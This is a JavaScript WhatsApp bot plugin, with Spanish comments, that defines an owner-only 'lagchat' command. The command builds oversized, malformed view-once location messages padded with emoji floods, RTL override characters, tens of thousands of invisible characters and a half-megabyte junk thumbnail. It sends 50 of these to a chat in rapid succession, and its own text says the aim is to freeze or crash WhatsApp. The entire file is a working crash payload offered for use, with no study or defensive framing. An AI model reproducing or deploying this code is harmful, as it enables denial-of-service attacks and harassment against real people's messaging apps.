const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣'.repeat(100) + '\u202E'.repeat(50), // emojis + unicode RTL
        degreesLongitude: '💥'.repeat(100) + '\u202E'.repeat(50),
        caption: '\u2063'.repeat(40000) + '💀'.repeat(3000), // spam invisible + emojis
        sequenceNumber: '999999',
        jpegThumbnail: Buffer.alloc(500000, 0), // medio MB de basura
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 LAGCHAT DESTRUCTOR 💥',
            body: 'Este mensaje está diseñado para romper WhatsApp.',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 50

  await m.reply(`⚠️ Enviando ${times} bombas pesadas al chat...\n💥 Esto puede hacer que WhatsApp se congele o cierre.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 100)) // menor delay = más presión
    } catch (error) {
      console.error('❌ Error al enviar mensaje:', error)
      await m.reply('❗ Fallo en la ejecución. El mensaje puede haber sido bloqueado.')
      return
    }
  }

  await m.reply('✅ *Lagchat destructivo completado.* ¿Sigue vivo tu WhatsApp? 😈')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler